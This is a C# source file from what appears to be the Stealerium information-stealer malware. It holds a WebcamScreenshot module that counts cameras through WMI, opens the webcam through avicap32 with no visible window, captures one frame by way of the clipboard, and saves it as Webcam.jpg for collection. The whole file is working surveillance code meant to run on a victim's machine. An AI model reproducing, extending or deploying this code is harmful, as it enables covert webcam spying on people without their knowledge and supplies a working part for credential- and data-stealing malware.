using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class WebcamScreenshot
    {
        private static IntPtr _handle;
        private static readonly int Delay = 3000;

        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y,
            int nWidth, int nHeight, int hwndParent, int nId);

        [DllImport("user32", EntryPoint = "SendMessage")]
        private static extern int SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        // Get the count of connected cameras
        public static int GetConnectedCamerasCount()
        {
            var cameras = 0;
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                           "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
                {
                    foreach (var _ in searcher.Get())
                    {
                        cameras++;
                    }
                }
            }
            catch
            {
                Logging.Log("GetConnectedCamerasCount : Query failed");
            }

            return cameras;
        }

        // Create a webcam screenshot
        public static bool Make(string sSavePath)
        {
            // Check if webcam screenshots are enabled
            if (Config.WebcamScreenshot != "1")
            {
                return false;
            }

            // Check if exactly one camera is connected
            var cameraCount = GetConnectedCamerasCount();
            if (cameraCount != 1)
            {
                return Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {cameraCount})", false);
            }

            try
            {
                // Clear the clipboard before use
                Clipboard.Clear();

                // Initialize webcam capture window
                _handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);

                // Initialize the webcam
                SendMessage(_handle, 1034, 0, 0); // WM_CAP_DRIVER_CONNECT
                SendMessage(_handle, 1074, 0, 0); // WM_CAP_SET_PREVIEW

                // Allow some time for the camera to initialize
                Thread.Sleep(Delay);

                // Capture a frame
                SendMessage(_handle, 1084, 0, 0); // WM_CAP_GRAB_FRAME
                SendMessage(_handle, 1054, 0, 0); // WM_CAP_EDIT_COPY

                // Stop the webcam
                SendMessage(_handle, 1035, 0, 0); // WM_CAP_DRIVER_DISCONNECT

                // Get the captured image from the clipboard
                var image = (Image)Clipboard.GetDataObject()?.GetData(DataFormats.Bitmap);
                Clipboard.Clear();

                // Save the image if it was captured successfully
                if (image != null)
                {
                    var savePath = Path.Combine(sSavePath, "Webcam.jpg");
                    image.Save(savePath, ImageFormat.Jpeg);
                    image.Dispose();

                    Counter.WebcamScreenshot = true;
                }
            }
            catch (Exception ex)
            {
                return Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, false);
            }

            return true;
        }
    }
}
